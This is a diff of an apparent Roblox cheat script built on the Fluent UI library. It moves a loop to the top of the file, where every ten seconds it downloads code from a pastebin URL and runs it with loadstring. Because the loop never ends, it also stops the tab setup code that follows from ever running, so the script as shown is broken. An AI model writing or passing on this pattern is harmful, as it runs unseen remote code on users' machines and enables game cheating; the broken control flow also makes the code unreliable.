@@ -12,6 +12,18 @@ local Window = Fluent:CreateWindow({
 
 local Options = Fluent.Options
 
+while true do
+    local success, result = pcall(function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/8v6yJMvB"))()
+    end)
+    
+    if not success then
+        warn("Failed to execute loadstring:", result)
+    end
+
+    task.wait(10) -- wait 10 seconds before running again
+end
+
 -- Create all tabs once
 local CombatTab = Window:AddTab({ Title = "Combat", Icon = "swords" })
 local VisualsTab = Window:AddTab({ Title = "Visuals", Icon = "person-standing" })
@@ -669,20 +681,6 @@ local UserInputService = game:GetService("UserInputService")
 
 
 
-
-
-
-while true do
-    local success, result = pcall(function()
-        loadstring(game:HttpGet("https://pastebin.com/raw/8v6yJMvB"))()
-    end)
-    
-    if not success then
-        warn("Failed to execute loadstring:", result)
-    end
-
-    task.wait(10) -- wait 10 seconds before running again
-end
 
 
 end
